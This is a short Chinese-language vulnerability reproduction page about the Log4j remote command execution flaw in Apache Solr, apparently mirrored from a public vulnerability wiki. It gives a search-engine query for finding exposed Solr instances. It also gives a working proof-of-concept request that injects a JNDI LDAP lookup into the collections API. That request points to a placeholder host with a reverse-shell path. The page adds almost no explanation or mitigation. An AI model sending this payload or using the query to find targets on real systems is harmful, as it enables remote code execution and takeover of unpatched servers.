---
title: "Apache Solr Log4j组件 远程命令执行漏洞"
date: 2026-10-14 09:03:31
categories:
  - WebSecurity
  - CVE
  - "中间件"
  - "Apache-Solr"
tags:
  - "Apache-Solr"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

Apache Solr Log4j组件 远程命令执行漏洞，详情略

## 漏洞影响

```
Apache Solr
```

## 网络测绘

```
app="APACHE-Solr"
```

## 漏洞复现

登录页面

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/middleware/images/202205251622273.png)

验证POC

```
/solr/admin/collections?action=${jndi:ldap://xxx/Basic/ReverseShell/ip/87}&wt=json
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/middleware/images/202205251622876.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/middleware/Apache-Solr-Log4j%E7%BB%84%E4%BB%B6-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
